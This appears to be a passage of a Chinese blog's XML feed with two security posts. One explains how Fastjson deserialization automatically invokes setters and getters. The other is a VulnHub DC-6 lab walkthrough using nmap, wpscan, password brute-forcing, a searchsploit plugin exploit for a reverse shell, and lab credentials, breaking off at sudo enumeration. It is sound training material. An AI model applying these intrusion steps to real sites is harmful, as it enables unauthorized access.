      <link href="/2023/02/07/skilllearning/java-an-quan/java-fan-xu-lie-hua/fastjson-pian/java-fan-xu-lie-hua-fastjson-pian-ji-ben-yuan-li/"/>
      <url>/2023/02/07/skilllearning/java-an-quan/java-fan-xu-lie-hua/fastjson-pian/java-fan-xu-lie-hua-fastjson-pian-ji-ben-yuan-li/</url>
      
        <content type="html"><![CDATA[<h1 id="Java-反序列化-Fastjson-篇-基本原理"><a href="#Java-反序列化-Fastjson-篇-基本原理" class="headerlink" title="Java 反序列化 Fastjson 篇 基本原理"></a>Java 反序列化 Fastjson 篇 基本原理</h1><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>FastJson是阿里巴巴开源的一个json库，能够快速的进行序列化和反序列化，用于将数据在JSON和Java Object之间互相转换</p><p>项目地址：<a href="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a></p><h2 id="2-Fastjson-使用"><a href="#2-Fastjson-使用" class="headerlink" title="2. Fastjson 使用"></a>2. Fastjson 使用</h2><p>Fastjson 主要使用两个方法进行序列化与反序列化操作</p><ul><li><p><code>JSON.toJSONString</code> 将 Java 对象转换为 json 对象，序列化的过程。</p></li><li><p><code>JSON.parseObject/JSON.parse</code> 将 json 对象重新变回 Java 对象；反序列化的过程</p></li></ul><h3 id="2-1-简单实现"><a href="#2-1-简单实现" class="headerlink" title="2.1 简单实现"></a>2.1 简单实现</h3><p>导入 Fastjson 1.2.24</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>fastjson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.2.24<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编写一个测试类</p><ul><li>Student.java</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"调用构造函数"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"调用构造函数"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"Student{"</span> <span class="token operator">+</span>                <span class="token string">"name='"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token char">'\''</span> <span class="token operator">+</span>                <span class="token string">", age="</span> <span class="token operator">+</span> age <span class="token operator">+</span>                <span class="token char">'}'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"调用getName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"调用getAge"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> age<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"调用setAge"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编写序列化</p><ul><li>StudentSerialize.java</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializerFeature</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">StudentSerialize</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">Student</span> student <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token string">"Joe"</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> jsonString <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>student<span class="token punctuation">,</span> <span class="token class-name">SerializerFeature<span class="token punctuation">.</span>WriteClassName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>jsonString<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果</p><pre class="line-numbers language-none"><code class="language-none">调用构造函数调用getAge调用getName{"@type":"org.example.Student","age":18,"name":"Joe"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在执行序列化时调用了 getter 方法，在设置 SerializerFeature.WriteClassName 的情况下 @type 为被序列化的类的类名</p><p>编写反序列化</p><ul><li>StudentUnserialize.java</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">Feature</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">StudentUnserialize</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">String</span> jsonString <span class="token operator">=</span> <span class="token string">"{\"@type\":\"org.example.Student\",\"age\":18,\"name\":\"Joe\"}"</span><span class="token punctuation">;</span>        <span class="token comment">// 如果需要还原出 private 属性的话还需要在 JSON.parseObject / JSON.parse 中加上 Feature.SupportNonPublicField 参数。</span>        <span class="token comment">// Student student = JSON.parseObject(jsonString, Student.class); 返回为空</span>        <span class="token class-name">Student</span> student <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>jsonString<span class="token punctuation">,</span> <span class="token class-name">Student</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Feature<span class="token punctuation">.</span>SupportNonPublicField</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>student<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果</p><pre class="line-numbers language-none"><code class="language-none">调用构造函数调用setAgeStudent{name='Joe', age=18}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在反序列化中会自动调用类中的 setter 方法，这里调用了非私有类的 setter 方法</p><h3 id="2-2-parseObject-不同传参"><a href="#2-2-parseObject-不同传参" class="headerlink" title="2.2 parseObject 不同传参"></a>2.2 parseObject 不同传参</h3><ul><li>未设置 Class 与 Feature</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSONObject</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">Feature</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">StudentUnserialize</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">String</span> jsonString <span class="token operator">=</span> <span class="token string">"{\"@type\":\"org.example.Student\",\"age\":18,\"name\":\"Joe\"}"</span><span class="token punctuation">;</span>        <span class="token class-name">JSONObject</span> student <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>jsonString<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>student<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果</p><pre class="line-numbers language-none"><code class="language-none">调用构造函数调用setAge调用getAge调用getName{"age":18}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>调用了所有 getter 方法与非私有类的 setter 方法，由于 name 为私有类，没有写入值</p><ul><li>指定了 Class</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">StudentUnserialize</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">String</span> jsonString <span class="token operator">=</span> <span class="token string">"{\"@type\":\"org.example.Student\",\"age\":18,\"name\":\"Joe\"}"</span><span class="token punctuation">;</span>        <span class="token class-name">Student</span> student <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>jsonString<span class="token punctuation">,</span> <span class="token class-name">Student</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>student<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果</p><pre class="line-numbers language-none"><code class="language-none">调用构造函数org.example.Student<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>没有调用 getter 方法，且没有调用私有属性的 setter 方法</p><ul><li>指定Class 与 Feature</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">Feature</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">StudentUnserialize</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">String</span> jsonString <span class="token operator">=</span> <span class="token string">"{\"@type\":\"org.example.Student\",\"age\":18,\"name\":\"Joe\"}"</span><span class="token punctuation">;</span>        <span class="token class-name">Student</span> student <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>jsonString<span class="token punctuation">,</span> <span class="token class-name">Student</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Feature<span class="token punctuation">.</span>SupportNonPublicField</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>student<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果</p><pre class="line-numbers language-none"><code class="language-none">调用构造函数调用setAgeStudent{name='Joe', age=18}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>通过反射写入了非私有属性</p><ul><li><p><strong>下面直接引用结论，Fastjson会对满足下列要求的<code>setter</code>/<code>getter</code>方法进行调用：</strong></p><p>满足条件的<code>setter</code>：</p><ul><li>函数名长度大于4且以set开头</li><li>非静态函数</li><li>返回类型为void或当前类</li><li>参数个数为1个</li></ul><p>满足条件的<code>getter</code>：</p><ul><li>函数名长度大于等于4</li><li>非静态方法</li><li>以get开头且第4个字母为大写</li><li>无参数</li><li>返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong</li></ul></li></ul><h3 id="2-3-parseObject-与-parse-的区别"><a href="#2-3-parseObject-与-parse-的区别" class="headerlink" title="2.3 parseObject 与 parse 的区别"></a>2.3 parseObject 与 parse 的区别</h3><p>FastJson中的 parse() 和 parseObject() 方法都可以用来将 JSON 字符串反序列化成 Java 对象，parseObject()  本质上也是调用 parse() 进行反序列化的。但是 parseObject() 会额外的将 Java 对象转为 JSONObject 对象，即 JSON.toJSON()。所以进行反序列化时的细节区别在于，parse() 会识别并调用目标类的 setter 方法及某些特定条件的 getter 方法，而 parseObject() 由于多执行了 JSON.toJSON(obj)，所以在处理过程中会调用反序列化目标类的所有 setter 和 getter 方法。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSONObject</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">Feature</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">StudentUnserialize</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">String</span> jsonString <span class="token operator">=</span> <span class="token string">"{\"@type\":\"org.example.Student\",\"age\":18,\"name\":\"Joe\"}"</span><span class="token punctuation">;</span>        <span class="token class-name">JSONObject</span> student1 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>jsonString<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Student</span> student2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Student</span><span class="token punctuation">)</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>jsonString<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>student1<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>student2<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-Fastjson-反序列化漏洞原理"><a href="#3-Fastjson-反序列化漏洞原理" class="headerlink" title="3. Fastjson 反序列化漏洞原理"></a>3. Fastjson 反序列化漏洞原理</h2><p>Fastjson 在反序列化的时候会执行构造函数、setter 与 getter 方法，如果这三个中存在危险操作就有可能进行利用</p><p>这里研究一下自动调用如何实现的</p><h3 id="3-1-自动调用-setter-getter-分析"><a href="#3-1-自动调用-setter-getter-分析" class="headerlink" title="3.1 自动调用 setter getter 分析"></a>3.1 自动调用 setter getter 分析</h3><p>主要与 JavaBeanInfo 中的 build 函数有关</p><ul><li>JavaBeanInfo#build</li></ul><p><img src="/../../../../../pic/image-20230208031656099.png"></p><p>通过反射获取传入的类的所有属性，方法以及构造方法</p><p>接下来进入到 if 中进行判断</p><p><img src="/../../../../../pic/image-20230208031840853.png"></p><p>在构造方法为空以及传入的类不为接口与抽象类的情况下会进入到该 if 之中</p><p>测试是使用到的是 Student 类因此不会进入到该 if 判断中，继续往下看</p><p>一直到第 328 行对方法的处理</p><p><img src="/../../../../../pic/image-20230208032956945.png"></p><p>这里使用了 4 个 if 进行判断，如果想继续执行下去需要满足以下这些条件</p><ul><li>方法名长度大于等于4</li><li>方法不能是静态方法</li><li>方法的没有返回值或者返回值为类本身</li><li>只能接受一个参数</li><li>方法开头必须是 set</li></ul><p>然后接下来对方法进行了进一步处理</p><p><img src="/../../../../../pic/image-20230208033146910.png"></p><p>获取方法名第四位字符，然后根据不同情况进行处理</p><p><img src="/../../../../../pic/image-20230208033959608.png"></p><p>最后处理后会将满足条件的插入到 fieldList 中</p><p>然后接下来是 getter 的处理，总结一下</p><ul><li>方法名长度大于等于4</li><li>方法不能是静态方法</li><li>方法开头必须是 get 同时第四个字符串为大写</li><li>方法返回的类型必须继承自Collection Map AtomicBoolean AtomicInteger AtomicLong</li><li>接受的传参为0</li></ul><p>处理到最后返回 JavaBeanInfo </p><p><img src="/../../../../../pic/image-20230208034731275.png"></p><p>其中存储着类的所有信息</p><h2 id="4-参考链接"><a href="#4-参考链接" class="headerlink" title="4. 参考链接"></a>4. 参考链接</h2><p><a href="https://johnfrod.top/%E5%AE%89%E5%85%A8/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E1-%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/">Fastjson反序列化漏洞(1)——基本原理</a></p><p><a href="http://wjlshare.com/archives/1512">http://wjlshare.com/archives/1512</a></p>]]></content>
      
      
      <categories>
          
          <category> Java 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fastjson 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub - DC_6</title>
      <link href="/2023/02/03/penetrationstest/ba-chang-xue-xi/vulnhub/dc-xi-lie/vulnhub-dc-6/"/>
      <url>/2023/02/03/penetrationstest/ba-chang-xue-xi/vulnhub/dc-xi-lie/vulnhub-dc-6/</url>
      
        <content type="html"><![CDATA[<h1 id="VulnHub-DC-6"><a href="#VulnHub-DC-6" class="headerlink" title="VulnHub - DC_6"></a>VulnHub - DC_6</h1><h2 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h2><ul><li><p>靶场地址：<a href="https://www.vulnhub.com/entry/dc-6,315/">VulnHub 链接</a></p></li><li><p>难度：简单</p></li><li><p>靶机目标：获取 1 个flag</p></li></ul><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2. 信息收集"></a>2. 信息收集</h2><h3 id="2-1-主机发现"><a href="#2-1-主机发现" class="headerlink" title="2.1 主机发现"></a>2.1 主机发现</h3><p>使用 nmap </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.0.1/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/image-20230203225355147.png"></p><h3 id="2-2-端口扫描"><a href="#2-2-端口扫描" class="headerlink" title="2.2 端口扫描"></a>2.2 端口扫描</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-sC</span> -p- <span class="token parameter variable">-T4</span> <span class="token number">192.168</span>.0.141<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/image-20230203225907847.png"></p><p>开放了 22 与 80 端口</p><h2 id="3-WEB-渗透"><a href="#3-WEB-渗透" class="headerlink" title="3. WEB 渗透"></a>3. WEB 渗透</h2><p>访问 <a href="http://192.168.0.141/">http://192.168.0.141/</a> 跳转到 <a href="http://wordy/%EF%BC%8C%E7%BB%91%E5%AE%9A%E4%B8%8B">http://wordy/，绑定下</a> hosts</p><p><img src="/../../../../../pic/image-20230203230124216.png"></p><p>又是个 WordPress 站点</p><p>题目描述中给了个线索</p><p><img src="/../../../../../pic/image-20230203232458747.png"></p><p>给出了一个密码字典，看来需要爆破后台登录，使用 wpscan 导出用户</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan <span class="token parameter variable">--url</span> http://wordy/ <span class="token parameter variable">--enumerate</span> u<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/image-20230203233459872.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"admin<span class="token entity" title="\n">\n</span>mark<span class="token entity" title="\n">\n</span>graham<span class="token entity" title="\n">\n</span>sarah<span class="token entity" title="\n">\n</span>jens"</span> <span class="token operator">&gt;</span> username.txt<span class="token function">cat</span> /usr/share/wordlists/rockyou.txt <span class="token operator">|</span> <span class="token function">grep</span> k01 <span class="token operator">&gt;</span> passwords.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../../pic/image-20230203234455999.png"></p><p>获得一个用户</p><p>访问 <a href="http://wordy/wp-login.php">http://wordy/wp-login.php</a> 使用 mark / helpdesk01 登录后台</p><p><img src="/../../../../../pic/image-20230204000100000.png"></p><p>安装了一个 Activity monitor 插件，查找是否存在历史漏洞</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit <span class="token string">"Activity monitor"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/image-20230205151958179.png"></p><p>使用这里的 45274.html，修改下目标地址以及执行命令</p><p><img src="/../../../../../pic/image-20230205152459112.png"></p><p>获得反弹 shell</p><p><img src="/../../../../../pic/image-20230205152511408.png"></p><p>在 mark 用户家目录下找到提示</p><p><img src="/../../../../../pic/image-20230205153206788.png"></p><p>获得了 graham 用户的密码，使用 graham / GSo7isUM1D4 登录  SSH</p><p>查看下 sudo 权限</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/image-20230205153320328.png"></p><p>查看该用户权限</p><pre 